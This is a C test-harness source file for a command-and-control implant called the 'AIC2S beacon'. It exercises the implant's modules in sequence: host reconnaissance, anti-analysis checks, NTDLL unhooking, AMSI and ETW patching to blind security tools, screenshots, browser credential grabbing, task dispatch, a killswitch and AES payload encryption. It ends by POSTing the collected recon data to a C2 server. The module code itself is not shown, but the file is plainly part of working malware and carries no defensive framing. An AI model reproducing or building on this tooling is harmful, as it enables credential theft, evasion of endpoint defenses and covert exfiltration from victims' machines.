// src/test_main.c — local test harness, no C2 needed
// Build target: beacon_test (see CMakeLists.txt)
// Compile flag: BEACON_TEST

#include "anti_analysis.h"
#include "common.h"
#include "comms.h"
#include "crypto.h"
#include "evasion.h"
#include "killswitch.h"
#include "postex.h"
#include "recon.h"
// ============================================================
// COMMS TEST — call this explicitly
// ============================================================
static BOOL test_comms(void) {
  printf("\n=== COMMS TEST ===\n");

  // step 1: connection check
  printf("[*] Step 1: checking_connection...\n");
  BOOL connected = FALSE;
  checking_connection(&connected);
  printf("[*] Connection result: %s\n", connected ? "OK" : "FAILED");
  if (!connected) {
    printf("[!] Cannot reach C2 at %S:%d\n", C2_HOST, C2_PORT);
    printf("[!] Is the listener running? Firewall open?\n");
    return FALSE;
  }

  // step 2: collect recon
  printf("[*] Step 2: collecting recon...\n");
  CHECKIN_INFO info = {0};
  recon_collect(&info);
  recon_print(&info);

  // step 3: serialize
  CHAR *json = NULL;
  DWORD jsonLen = 0;
  recon_serialize(&info, &json, &jsonLen);
  printf("[*] Step 3: JSON (%lu bytes):\n%s\n", jsonLen, json);

  // step 4: POST to C2
  printf("[*] Step 4: beacon_post...\n");
  BYTE *response = NULL;
  DWORD respLen = 0;
  BOOL posted = beacon_post((BYTE *)json, jsonLen, &response, &respLen);
  printf("[*] beacon_post returned: %s\n", posted ? "TRUE" : "FALSE");

  if (response && respLen > 0) {
    printf("[+] C2 response (%lu bytes):\n%.*s\n", respLen, respLen,
           (char *)response);
    HeapFree(GetProcessHeap(), 0, response);
  } else {
    printf("[!] No response body from C2\n");
  }

  HeapFree(GetProcessHeap(), 0, json);
  return posted;
}

int main() {
  printf("=== AIC2S BEACON LOCAL TEST ===\n\n");
#ifdef BEACON_TEST
#pragma message("BEACON_TEST is defined — cert bypass enabled")
#else
#pragma message("BEACON_TEST is NOT defined — cert bypass DISABLED")
#endif

  // ── Test 1: Recon ─────────────────────────────────────────
  printf("[TEST 1] Recon\n");
  CHECKIN_INFO info = {0};
  recon_collect(&info);
  recon_print(&info);

  CHAR *json = NULL;
  DWORD len = 0;
  recon_serialize(&info, &json, &len);
  printf("[TEST 1] JSON (%lu bytes):\n%s\n\n", len, json);
  HeapFree(GetProcessHeap(), 0, json);

  // ── Test 2: Anti-analysis ─────────────────────────────────
  printf("[TEST 2] Anti-analysis (SKIPPED ExitProcess in test mode)\n");
  anti_analysis_run(FALSE);

  // ── Test 3: Evasion ───────────────────────────────────────
  printf("[TEST 3] NTDLL unhook\n");
  if (!unhook_ntdll())
    printf("[!] unhook_ntdll failed\n");

  printf("[TEST 3] AMSI patch\n");
  patch_amsi();

  printf("[TEST 3] ETW patch\n");
  patch_etw();

  // ── Test 4: Screenshot ────────────────────────────────────
  printf("\n[TEST 4] Screenshot\n");
  postex_run("screenshot");

  // ── Test 5: Browser file collection ──────────────────────
  printf("\n[TEST 5] Browser file collection\n");
  postex_run("grab_creds");

  // ── Test 6: Dispatch with fake whoami task ────────────────
  printf("\n[TEST 6] dispatch_task with fake whoami task\n");
  const CHAR *fakeTask =
      "{\"id\":\"test-001\",\"command\":\"whoami\",\"args\":null}";
  printf("  Fake task JSON: %s\n", fakeTask);
  dispatch_task((BYTE *)fakeTask, (DWORD)strlen(fakeTask));

  // ── Test 7: Killswitch ────────────────────────────────────
  printf("\n[TEST 7] killswitch\n");
  printf("  soft kill active: %s\n", killswitch_is_active() ? "YES" : "NO");
  killswitch_soft();
  printf("[!] KILLSWITCH: soft kill — beacon going dormant\n");
  printf("  after killswitch_soft: %s\n",
         killswitch_is_active() ? "YES" : "NO");

  // ── Test 8: AES roundtrip ────────────────────────────────
  printf("\n[TEST 8] AES roundtrip\n");
  const CHAR *plaintext = "AIC2S beacon test!";
  PVOID pCipher = NULL;
  DWORD cipherLen = 0;
  PVOID pDecrypt = NULL;
  DWORD decryptLen = 0;

  if (aes_encrypt_payload((PBYTE)plaintext, (DWORD)strlen(plaintext), &pCipher,
                          &cipherLen)) {
    printf("  Encrypted: %lu bytes\n", cipherLen);
    if (aes_decrypt_payload((PBYTE)pCipher, cipherLen, &pDecrypt,
                            &decryptLen)) {
      printf("  Decrypted: %.*s\n", decryptLen, (CHAR *)pDecrypt);
      printf("  Match: %s\n",
             memcmp(pDecrypt, plaintext, strlen(plaintext)) == 0 ? "PASS"
                                                                 : "FAIL");
      HeapFree(GetProcessHeap(), 0, pDecrypt);
    }
    HeapFree(GetProcessHeap(), 0, pCipher);
  } else {
    printf("[!] aes_encrypt_payload failed\n");
  }
  printf("\n=== TEST 9: COMMS ===\n");
  if (test_comms()) {
    printf("[+] COMMS: PASS\n");
  } else {
    printf("[!] COMMS: FAIL\n");
  }

  printf("\n=== TEST COMPLETE ===\n");
  return 0;
}